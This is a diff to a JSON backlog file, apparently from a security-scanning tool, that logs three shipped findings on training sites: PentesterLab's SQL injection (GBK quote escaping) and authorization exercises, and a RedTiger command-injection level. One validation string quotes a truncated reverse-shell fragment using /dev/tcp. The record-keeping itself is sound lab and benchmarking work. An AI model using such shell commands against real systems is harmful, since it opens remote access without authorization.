@@ -4055,6 +4055,24 @@
       "slug": "hts-application-35-mission-seed",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: /missions/application/35/ returns Login Required + HTS training ground tagline; extractHackThisSiteMissionSeeds adds application/35; findings 0→6 incl client-side-hts-login-gated-mission-hub-evidence; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:pentesterlab.com",
+      "slug": "client-side-pentesterlab-sqli-06-exercise-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: JSON-LD SQL Injection 06 + improper escaping of single quotes in a GBK charset connection; pentesterlab.com/exercises/sqli_06 findings 3→4; benchmark juice-shop 6/6 maintained"
+    },
+    {
+      "source": "discovery:pentesterlab.com",
+      "slug": "client-side-pentesterlab-autho-05-exercise-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: JSON-LD Authorization 05 + preventing direct creation of a user with admin privileges reveals another vector; pentesterlab.com/exercises/autho_05 findings 3→4; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-command-injection-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: level10.php HTML comment !`sh >& /dev/tcp/...` + level10login POST password form; redtiger level10 findings 3→4; benchmark 6/6 maintained"
     }
   ],
   "shipped": [
@@ -7217,6 +7235,21 @@
       "source": "discovery:www.hackthissite.org",
       "slug": "hts-application-35-mission-seed",
       "shipped_at": "2026-07-17T19:10:00.000Z"
+    },
+    {
+      "source": "discovery:pentesterlab.com",
+      "slug": "client-side-pentesterlab-sqli-06-exercise-evidence",
+      "shipped_at": "2026-07-17T20:35:00.000Z"
+    },
+    {
+      "source": "discovery:pentesterlab.com",
+      "slug": "client-side-pentesterlab-autho-05-exercise-evidence",
+      "shipped_at": "2026-07-17T20:35:00.000Z"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-command-injection-evidence",
+      "shipped_at": "2026-07-17T20:35:00.000Z"
     }
   ]
 }
